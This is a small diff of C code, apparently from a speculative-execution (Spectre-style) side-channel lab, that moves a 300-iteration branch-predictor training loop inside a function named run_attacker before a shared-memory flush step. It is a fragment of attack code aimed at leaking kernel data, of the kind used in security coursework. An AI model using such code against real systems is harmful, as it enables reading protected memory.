@@ -44,9 +44,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     //Step 1 : Train the branch predictor 
 
-        for (int i =0; i<300; i++) {
-            call_kernel_part2 (kernel_fd, shared_memory, 1);
-        } 
+        //for (int i =0; i<300; i++) {
+          //  call_kernel_part2 (kernel_fd, shared_memory, 1);
+       // } 
 
     printf("Launching attacker\n");
 
@@ -56,9 +56,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         //Step 1 : Train the branch predictor 
 
-        //for (int i =0; i<300; i++) {
-          //  call_kernel_part2 (kernel_fd, shared_memory, 1);
-        //} 
+        for (int i =0; i<300; i++) {
+            call_kernel_part2 (kernel_fd, shared_memory, 1);
+        } 
 
 
         // Step1 : Flush the shared memory 
